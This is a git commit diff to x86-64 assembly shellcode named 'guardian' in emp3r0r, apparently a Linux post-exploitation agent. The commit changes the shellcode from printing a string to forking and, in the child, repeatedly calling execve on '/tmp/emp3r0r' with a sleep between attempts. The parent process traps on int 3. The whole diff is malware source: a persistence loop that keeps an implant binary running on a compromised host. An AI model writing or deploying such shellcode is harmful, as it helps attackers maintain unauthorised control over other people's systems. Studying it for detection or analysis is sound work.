92eafc4b88dda060f571d728abaf46c54457c910
jm33-m0 <jm33.m0@gmail.com>
2021-01-17 14:21:53 +0800

    exec emp3r0r in child

--- shellcode/guardian.asm
+++ shellcode/guardian.asm
@@ -1,7 +1,15 @@
 	BITS 64
 
 	section .data
-	msg     db "emp3r0r", 0xa
+
+	;;   emp3r0r path
+	path db "/tmp/emp3r0r"
+
+	;; timespec
+
+timespec:
+	tv_sec  dq 1
+	tv_nsec dq 200000000
 
 	section .text
 	global  _start
@@ -13,29 +21,34 @@ _start:
 	mov al, 0x39; syscall fork
 	syscall
 
-	cmp  rax, 0x0; if in child process
-	je   write
-	call pause; stop the parent
-
-write:
-	;;   write emp3r0r to stdout
-	xor  rax, rax
-	xor  rdi, rdi
-	mov  al, 0x01; syscall write
-	mov  di, 1; fd is stdout
-	mov  esi, msg; the msg text
-	mov  edx, 8; count
-	syscall
-	call exit
+	cmp rax, 0x0; if in child process
+	je  exec
 
 pause:
 	;;  stop
 	int 0x3
+
+exec:
+	;;   execute emp3r0r
+	xor  rax, rax
+	xor  rdi, rdi
+	mov  al, 0x3b; syscall execve
+	mov  rdi, path; filename
+	syscall
+	call sleep
+	jmp  exec
+
+sleep:
+	;;  sleep 1.2 second
+	mov al, 0x23; syscall nanosleep
+	mov rdi, timespec; timespec
+	xor rsi, rsi; no more args
+	syscall
 
 exit:
 	;;  exit
 	xor rax, rax
 	xor rdi, rdi
 	mov al, 0x3c; syscall exit
-	mov di, 0x00; exit code
+	mov di, 0x0; exit code
 	syscall
